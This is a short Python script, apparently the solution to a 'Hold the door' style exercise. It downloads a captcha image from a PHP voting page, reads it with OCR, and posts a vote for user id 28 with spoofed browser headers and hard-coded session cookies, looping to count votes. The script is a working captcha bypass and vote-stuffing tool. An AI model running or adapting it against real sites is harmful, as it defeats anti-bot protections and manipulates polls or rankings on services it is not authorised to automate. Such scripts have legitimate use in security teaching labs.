#!/usr/bin/python3
from PIL import Image
import requests
import pytesseract
from colorama import Fore



url = 'http://158.69.76.135/level3.php'
headers = {
    'Referer': 'http://158.69.76.135/level3.php',
    'Host': '158.69.76.135',
    'Origin': 'http://158.69.76.135',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36'
}
cookies = {
    'PHPSESSID': '84cgtshoc5m5mvabqrrce85f64',
    'HoldTheDoor': '28e17abbc149c094647577d5d2adabae3f8bc321'
}

captcha = requests.get('http://158.69.76.135/captcha.php', cookies=cookies, headers=headers)
open('captcha.png', 'wb').write(captcha.content)

captcha_text = pytesseract.image_to_string(Image.open('captcha.png'))
print(captcha_text)

myobj = {
    'id': '28',
    'holdthedoor': 'Submit',
    'key': '28e17abbc149c094647577d5d2adabae3f8bc321',
    'captcha': captcha_text
}

for i in range(1, 2):
    requests.post(url, data=myobj, cookies=cookies, headers=headers)
    print(Fore.YELLOW +"voting for: {}, I've done {} votes".format(myobj.get("id"), i))
print(Fore.GREEN + "I've done {} votes, by the user {}".format(i, (myobj.get("id"))))
